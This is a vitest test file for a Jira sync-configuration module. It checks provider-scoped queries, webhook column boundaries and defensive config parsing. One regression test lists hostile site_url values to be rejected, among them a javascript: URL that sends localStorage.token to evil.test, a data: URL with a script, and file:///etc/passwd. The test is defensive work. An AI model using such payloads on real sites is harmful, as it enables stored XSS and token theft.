import { describe, it, expect, vi, beforeEach } from 'vitest'
import { createAsanaRemoteFake, type AsanaRemoteFake } from '@/test/asana-remote-fake'

/**
 * Tests for src/lib/tasks/jira-config.ts — the jira half of `task_sync_state`.
 *
 * Every consumer of this file mocks it, which is exactly why it needs tests of
 * its own: what matters here is not the return values (trivially mockable) but
 * the QUERY PREDICATES, and a mocked module proves nothing about them. Two are
 * load-bearing:
 *
 *  - Every read/write is scoped `.eq('provider', 'jira')`. Asana and Jira rows
 *    share one table AND one UNIQUE(account_id), so an unscoped read in a
 *    workspace with both connected would hand a Jira push an Asana destination
 *    (or vice versa) — a silent cross-provider corruption, not an error.
 *  - The reader never SELECTs a webhook column. For Jira the secret column is
 *    permanently NULL (Atlassian's deliveries are unsigned), but the column
 *    boundary is asserted anyway so a later phase can't widen this query and
 *    leak the Asana secret of a co-resident row through a shared reader.
 *
 * Runs the REAL query chains against the filter-aware fake in
 * src/test/asana-remote-fake.ts — provider-agnostic Supabase plumbing despite
 * the name, since it applies eq/not/gt against actual rows.
 */

let dbFake: AsanaRemoteFake = createAsanaRemoteFake()
vi.mock('@/lib/admin', () => ({ getServiceClient: () => dbFake.client }))

const {
  JIRA_PROVIDER,
  clearJiraWebhookRegistration,
  isJiraDestinationConfigured,
  includesJiraAttribution,
  listJiraSyncStates,
  listJiraWebhookRegistrationsForAccount,
  loadJiraReconcileState,
  loadJiraSyncState,
  loadJiraWebhookState,
  parseJiraConfig,
  saveJiraConfig,
  saveJiraWebhookRegistration,
  stampJiraReconciledAt,
  statusForBucket,
} = await import('@/lib/tasks/jira-config')

// ---- Helpers ---------------------------------------------------------------

const SYNC_STATE_ID = 'tss-jira-1'

const CONFIG = {
  cloud_id: 'cafe0001',
  site_name: 'Acme',
  site_url: 'https://acme.atlassian.net',
  project_id: '10000',
  project_key: 'ENG',
  project_name: 'Engineering',
  issue_type_id: '10001',
  issue_type_name: 'Task',
  status_map: { not_started: '1', in_progress: null, done: '3', canceled: null },
}

function setDb(row: Record<string, unknown> = {}, extra: Array<Record<string, unknown>> = []) {
  dbFake = createAsanaRemoteFake({
    syncStates: [
      {
        id: SYNC_STATE_ID,
        workspace_id: 'ws-1',
        account_id: 'acct-1',
        user_id: 'u-1',
        provider: JIRA_PROVIDER,
        config: CONFIG,
        created_at: '2026-07-01T00:00:00.000Z',
        ...row,
      } as never,
      ...(extra as never[]),
    ],
  })
  return dbFake
}

beforeEach(() => {
  vi.clearAllMocks()
  setDb()
})

// ---- parseJiraConfig -------------------------------------------------------

describe('parseJiraConfig', () => {
  it('reads the full destination triple plus display fields', () => {
    expect(parseJiraConfig(CONFIG)).toEqual(CONFIG)
  })

  it('degrades a junk row to "not configured" rather than throwing', () => {
    expect(parseJiraConfig(null)).toEqual({})
    expect(parseJiraConfig(undefined)).toEqual({})
    expect(parseJiraConfig({ project_id: 10000, project_name: '' })).toEqual({})
    expect(parseJiraConfig({ status_map: ['nope'] })).toEqual({})
    expect(parseJiraConfig({ status_map: 'done' })).toEqual({})
  })

  it('normalizes a partial status_map to all four buckets', () => {
    expect(parseJiraConfig({ status_map: { done: '3', canceled: 7 } })).toEqual({
      status_map: { not_started: null, in_progress: null, done: '3', canceled: null },
    })
  })

  it('drops unknown keys instead of round-tripping them', () => {
    // The config is an untrusted jsonb blob; only the fields this build knows
    // about survive a read-modify-write through the settings PATCH.
    expect(parseJiraConfig({ project_id: '1', sneaky: 'value' })).toEqual({ project_id: '1' })
  })

  /**
   * REGRESSION (review finding: "unvalidated jira site_url reaches
   * openExternalUrl/window.open — stored XSS via javascript: scheme").
   *
   * The settings PATCH now refuses a non-http(s) `site_url`, but rows written
   * before that check exists (or by anything holding the service role) still
   * carry whatever they carry. `site_url` is the base of the `/browse/{KEY}`
   * permalink COPIED onto every pushed action, so a hostile value has to
   * degrade to ABSENT at the read boundary rather than only at the click:
   * issueBrowseUrl and nativeCreateIssueUrl both already null-guard a falsy
   * site_url, so dropping it here costs a link and nothing else.
   */
  it('drops a site_url that is not an absolute http(s) url', () => {
    for (const hostile of [
      'javascript:fetch("https://evil.test?t="+localStorage.token)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'acme.atlassian.net',
    ]) {
      const parsed = parseJiraConfig({ cloud_id: 'cafe0001', site_url: hostile })
      expect(parsed).toEqual({ cloud_id: 'cafe0001' })
    }
  })

  it('keeps an ordinary http(s) site_url', () => {
    expect(parseJiraConfig({ site_url: 'https://acme.atlassian.net' })).toEqual({
      site_url: 'https://acme.atlassian.net',
    })
    expect(parseJiraConfig({ site_url: 'http://jira.internal:8080' })).toEqual({
      site_url: 'http://jira.internal:8080',
    })
  })

  it('ignores an unknown bucket inside status_map', () => {
    const parsed = parseJiraConfig({ status_map: { done: '3', blocked: '99' } })
    expect(parsed.status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: '3',
      canceled: null,
    })
  })

  it('carries include_dial8_attribution through only as a real boolean', () => {
    expect(parseJiraConfig({ include_dial8_attribution: false })).toEqual({
      include_dial8_attribution: false,
    })
    expect(parseJiraConfig({ include_dial8_attribution: true })).toEqual({
      include_dial8_attribution: true,
    })
    // A hand-edited string is left ABSENT rather than coerced — "false" is
    // truthy, and coercing it would silently flip an opt-out into an opt-in.
    expect(parseJiraConfig({ include_dial8_attribution: 'false' })).toEqual({})
    expect(parseJiraConfig({ include_dial8_attribution: 0 })).toEqual({})
  })
})

describe('includesJiraAttribution', () => {
  it('defaults to ON when the key is absent — every pre-existing connection', () => {
    expect(includesJiraAttribution({})).toBe(true)
    expect(includesJiraAttribution({ project_id: '10000' })).toBe(true)
  })

  it('is off ONLY for an explicit false', () => {
    expect(includesJiraAttribution({ include_dial8_attribution: false })).toBe(false)
    expect(includesJiraAttribution({ include_dial8_attribution: true })).toBe(true)
  })
})

describe('statusForBucket', () => {
  it('reads through, treating blanks and absent buckets as unmapped', () => {
    expect(statusForBucket({ status_map: { done: '3' } }, 'done')).toBe('3')
    expect(statusForBucket({ status_map: { done: '' } }, 'done')).toBeNull()
    expect(statusForBucket({ status_map: { done: null } }, 'done')).toBeNull()
    expect(statusForBucket({}, 'done')).toBeNull()
  })
})

describe('isJiraDestinationConfigured', () => {
  it('requires ALL THREE of cloud_id, project_id and issue_type_id', () => {
    expect(isJiraDestinationConfigured(CONFIG)).toBe(true)
  })

  it('rejects a project picked WITHOUT an issue type', () => {
    // A real, reachable state: changing project deliberately clears the issue
    // type. `POST /issue` cannot be built without one, so this must not read as
    // configured anywhere.
    expect(isJiraDestinationConfigured({ ...CONFIG, issue_type_id: undefined })).toBe(false)
  })

  it('rejects a config with no cloud_id — the request cannot even be addressed', () => {
    expect(isJiraDestinationConfigured({ ...CONFIG, cloud_id: undefined })).toBe(false)
  })

  it('rejects a site picked with no project', () => {
    expect(isJiraDestinationConfigured({ cloud_id: 'c', site_name: 'Acme' })).toBe(false)
  })

  it('rejects an empty config', () => {
    expect(isJiraDestinationConfigured({})).toBe(false)
  })

  it('does NOT treat a lingering project_name/key as a destination', () => {
    expect(isJiraDestinationConfigured({ project_name: 'Engineering', project_key: 'ENG' })).toBe(
      false,
    )
  })
})

// ---- loadJiraSyncState -----------------------------------------------------

describe('loadJiraSyncState', () => {
  it('scopes to the workspace AND the jira provider', async () => {
    await loadJiraSyncState('ws-1')

    expect(dbFake.syncStateQueries[0].filters).toEqual([
      { op: 'eq', col: 'workspace_id', val: 'ws-1' },
      { op: 'eq', col: 'provider', val: 'jira' },
    ])
  })

  it('IGNORES a co-resident asana row in the same workspace', async () => {
    // The single most dangerous cross-provider bug available in this table: both
    // providers live in it, and an unscoped read would hand a Jira push an Asana
    // destination with no error anywhere.
    setDb({ id: 'tss-asana', provider: 'asana', config: { project_gid: 'proj-1' } }, [
      {
        id: SYNC_STATE_ID,
        workspace_id: 'ws-1',
        account_id: 'acct-2',
        user_id: 'u-1',
        provider: JIRA_PROVIDER,
        config: CONFIG,
        created_at: '2026-07-02T00:00:00.000Z',
      },
    ])

    const state = await loadJiraSyncState('ws-1')
    expect(state?.id).toBe(SYNC_STATE_ID)
    expect(state?.config.project_id).toBe('10000')
  })

  it('NEVER selects a webhook column', async () => {
    const state = await loadJiraSyncState('ws-1')

    expect(dbFake.syncStateQueries[0].columns).toEqual(['id', 'account_id', 'user_id', 'config'])
    expect(JSON.stringify(state)).not.toContain('webhook')
    expect(state).toEqual({
      id: SYNC_STATE_ID,
      accountId: 'acct-1',
      userId: 'u-1',
      config: CONFIG,
    })
  })

  it('picks the OLDEST row when a workspace has two connected Jira accounts', async () => {
    // Stable destination: it must not flip based on who connected most recently.
    setDb({ created_at: '2026-07-01T00:00:00.000Z' }, [
      {
        id: 'tss-newer',
        workspace_id: 'ws-1',
        account_id: 'acct-2',
        user_id: 'u-2',
        provider: JIRA_PROVIDER,
        config: {},
        created_at: '2026-07-09T00:00:00.000Z',
      },
    ])

    expect((await loadJiraSyncState('ws-1'))?.id).toBe(SYNC_STATE_ID)
  })

  it('returns null for a workspace with no Jira row', async () => {
    expect(await loadJiraSyncState('ws-OTHER')).toBeNull()
  })

  it('parses the stored config defensively on the way out', async () => {
    setDb({ config: { project_id: 42, status_map: { done: '3' } } })
    const state = await loadJiraSyncState('ws-1')
    expect(state?.config).toEqual({
      status_map: { not_started: null, in_progress: null, done: '3', canceled: null },
    })
  })
})

// ---- saveJiraConfig --------------------------------------------------------

describe('saveJiraConfig', () => {
  it('writes the config wholesale and stamps updated_at', async () => {
    const next = { ...CONFIG, project_id: '20000' }
    const result = await saveJiraConfig(SYNC_STATE_ID, next)

    expect(result).toEqual({ error: null })
    const write = dbFake.syncStateUpdates[0]
    expect(write.patch.config).toEqual(next)
    expect(write.patch.updated_at).toBeTruthy()
    expect(write.matchedIds).toEqual([SYNC_STATE_ID])
  })

  it('targets the row by id', async () => {
    await saveJiraConfig(SYNC_STATE_ID, {})
    expect(dbFake.syncStateUpdates[0].filters).toEqual([
      { op: 'eq', col: 'id', val: SYNC_STATE_ID },
    ])
  })

  it('surfaces a DB error rather than reporting success', async () => {
    dbFake = createAsanaRemoteFake({ syncStateError: { message: 'permission denied' } })
    expect(await saveJiraConfig(SYNC_STATE_ID, {})).toEqual({ error: 'permission denied' })
  })
})

// ---- loadJiraWebhookState --------------------------------------------------

describe('loadJiraWebhookState', () => {
  it('scopes to the row AND the jira provider', async () => {
    await loadJiraWebhookState(SYNC_STATE_ID)
    expect(dbFake.syncStateQueries[0].filters).toEqual([
      { op: 'eq', col: 'id', val: SYNC_STATE_ID },
      { op: 'eq', col: 'provider', val: 'jira' },
    ])
  })

  it('reads the registration and lifts the site + project out of the config', async () => {
    setDb({ webhook_gid: '6000', webhook_registered_at: '2026-07-20T00:00:00.000Z' })
    expect(await loadJiraWebhookState(SYNC_STATE_ID)).toEqual({
      id: SYNC_STATE_ID,
      workspaceId: 'ws-1',
      accountId: 'acct-1',
      userId: 'u-1',
      webhookId: '6000',
      webhookRegisteredAt: '2026-07-20T00:00:00.000Z',
      cloudId: 'cafe0001',
      projectId: '10000',
    })
  })

  it('NEVER selects webhook_secret — the Asana rows next door hold a live key', async () => {
    // For a jira row that column is permanently NULL (dynamic webhooks are
    // unsigned), so this is not about hiding our own secret. task_sync_state is
    // SHARED: keeping every jira reader provably secret-free is what stops a
    // later refactor widening one of these queries into a leak.
    const state = await loadJiraWebhookState(SYNC_STATE_ID)
    expect(dbFake.syncStateQueries[0].columns).toEqual([
      'id',
      'workspace_id',
      'account_id',
      'user_id',
      'config',
      'webhook_gid',
      'webhook_registered_at',
    ])
    expect(JSON.stringify(state)).not.toContain('secret')
  })

  it('reports an unregistered row as nulls rather than throwing', async () => {
    const state = await loadJiraWebhookState(SYNC_STATE_ID)
    expect(state).toMatchObject({ webhookId: null, webhookRegisteredAt: null })
  })

  it('refuses to read an ASANA row through the jira reader', async () => {
    setDb({ provider: 'asana' })
    expect(await loadJiraWebhookState(SYNC_STATE_ID)).toBeNull()
  })

  it('returns null for an unknown id', async () => {
    expect(await loadJiraWebhookState('tss-nope')).toBeNull()
  })
})

// ---- saveJiraWebhookRegistration / clear -----------------------------------

describe('saveJiraWebhookRegistration', () => {
  it('stores the id and stamps the refresh clock together', async () => {
    // The two columns move as one: an id with no clock would be refreshed on
    // every tick, and a clock with no id refers to nothing.
    await saveJiraWebhookRegistration(SYNC_STATE_ID, '6000')

    const write = dbFake.syncStateUpdates[0]
    expect(write.patch.webhook_gid).toBe('6000')
    expect(write.patch.webhook_registered_at).toBeTruthy()
    expect(write.matchedIds).toEqual([SYNC_STATE_ID])
  })

  it('accepts an explicit timestamp so a REFRESH can restamp the same id', async () => {
    await saveJiraWebhookRegistration(SYNC_STATE_ID, '6000', '2026-07-26T00:00:00.000Z')
    expect(dbFake.syncStateUpdates[0].patch.webhook_registered_at).toBe(
      '2026-07-26T00:00:00.000Z',
    )
  })

  it('surfaces a DB error rather than reporting success', async () => {
    dbFake = createAsanaRemoteFake({ syncStateError: { message: 'permission denied' } })
    expect(await saveJiraWebhookRegistration(SYNC_STATE_ID, '6000')).toEqual({
      error: 'permission denied',
    })
  })
})

describe('clearJiraWebhookRegistration', () => {
  it('nulls the id and the clock', async () => {
    setDb({ webhook_gid: '6000', webhook_registered_at: '2026-07-20T00:00:00.000Z' })
    await clearJiraWebhookRegistration(SYNC_STATE_ID)

    expect(dbFake.syncStateUpdates[0].patch).toMatchObject({
      webhook_gid: null,
      webhook_registered_at: null,
    })
    expect(dbFake.syncStates[0].webhook_gid).toBeNull()
  })

  it('does NOT touch the handshake columns — jira has no handshake', async () => {
    // Writing them would imply this provider has a secret to rotate. It doesn't:
    // Atlassian offers no way to attach one to a dynamic webhook.
    await clearJiraWebhookRegistration(SYNC_STATE_ID)
    const patch = dbFake.syncStateUpdates[0].patch
    expect(patch).not.toHaveProperty('webhook_secret')
    expect(patch).not.toHaveProperty('webhook_pending_at')
  })
})

// ---- listJiraWebhookRegistrationsForAccount --------------------------------

describe('listJiraWebhookRegistrationsForAccount', () => {
  it('returns each id WITH its site — a delete cannot be addressed without one', async () => {
    setDb({ webhook_gid: '6000' })
    expect(await listJiraWebhookRegistrationsForAccount('acct-1')).toEqual([
      { webhookId: '6000', cloudId: 'cafe0001' },
    ])
  })

  it('scopes to the account, the jira provider and a non-null id', async () => {
    await listJiraWebhookRegistrationsForAccount('acct-1')
    expect(dbFake.syncStateQueries[0].filters).toEqual([
      { op: 'eq', col: 'account_id', val: 'acct-1' },
      { op: 'eq', col: 'provider', val: 'jira' },
      { op: 'not', col: 'webhook_gid', val: null, notOp: 'is' },
    ])
  })

  it('excludes an ASANA row registered by the same account', async () => {
    setDb({ provider: 'asana', webhook_gid: 'asana-gid' })
    expect(await listJiraWebhookRegistrationsForAccount('acct-1')).toEqual([])
  })

  it('reports a null site rather than dropping the row silently', async () => {
    // The caller skips it — but "we know of a registration we cannot address" is
    // different information from "there is nothing registered".
    setDb({ webhook_gid: '6000', config: {} })
    expect(await listJiraWebhookRegistrationsForAccount('acct-1')).toEqual([
      { webhookId: '6000', cloudId: null },
    ])
  })
})

// ---- loadJiraReconcileState / listJiraSyncStates / stamp -------------------

describe('loadJiraReconcileState', () => {
  it('carries the cloudId — every Jira read has to be addressed to a site', async () => {
    setDb({ last_reconcile_at: '2026-07-25T00:00:00.000Z' })
    expect(await loadJiraReconcileState(SYNC_STATE_ID)).toEqual({
      id: SYNC_STATE_ID,
      workspaceId: 'ws-1',
      accountId: 'acct-1',
      userId: 'u-1',
      cloudId: 'cafe0001',
      lastReconcileAt: '2026-07-25T00:00:00.000Z',
    })
  })

  it('NEVER selects a webhook column', async () => {
    // A separate reader from loadJiraWebhookState on purpose: the sweep has no
    // business holding a registration, and keeping the readers narrow is what
    // makes the boundary auditable.
    await loadJiraReconcileState(SYNC_STATE_ID)
    expect(dbFake.syncStateQueries[0].columns).toEqual([
      'id',
      'workspace_id',
      'account_id',
      'user_id',
      'config',
      'last_reconcile_at',
    ])
  })

  it('scopes to the jira provider and returns null for an asana row', async () => {
    setDb({ provider: 'asana' })
    expect(await loadJiraReconcileState(SYNC_STATE_ID)).toBeNull()
  })
})

describe('listJiraSyncStates', () => {
  it('lists the fleet, scoped to jira', async () => {
    setDb({}, [
      {
        id: 'tss-asana',
        workspace_id: 'ws-2',
        account_id: 'acct-9',
        user_id: 'u-9',
        provider: 'asana',
        config: {},
        created_at: '2026-07-02T00:00:00.000Z',
      },
    ])

    expect(await listJiraSyncStates()).toEqual([{ id: SYNC_STATE_ID, workspaceId: 'ws-1' }])
    expect(dbFake.syncStateQueries[0].filters).toEqual([
      { op: 'eq', col: 'provider', val: 'jira' },
    ])
  })

  it('THROWS on a DB error rather than reporting an empty fleet', async () => {
    // The cron treats the return value as "everyone connected"; swallowing an
    // error here would silently stop every workspace's read-back.
    dbFake = createAsanaRemoteFake({ syncStateError: { message: 'db down' } })
    await expect(listJiraSyncStates()).rejects.toThrow('db down')
  })
})

describe('stampJiraReconciledAt', () => {
  it('stamps the clock the 6-hour gate reads', async () => {
    await stampJiraReconciledAt(SYNC_STATE_ID)
    const write = dbFake.syncStateUpdates[0]
    expect(write.patch.last_reconcile_at).toBeTruthy()
    expect(write.filters).toEqual([{ op: 'eq', col: 'id', val: SYNC_STATE_ID }])
  })

  it('surfaces a DB error', async () => {
    dbFake = createAsanaRemoteFake({ syncStateError: { message: 'db down' } })
    expect(await stampJiraReconciledAt(SYNC_STATE_ID)).toEqual({ error: 'db down' })
  })
})
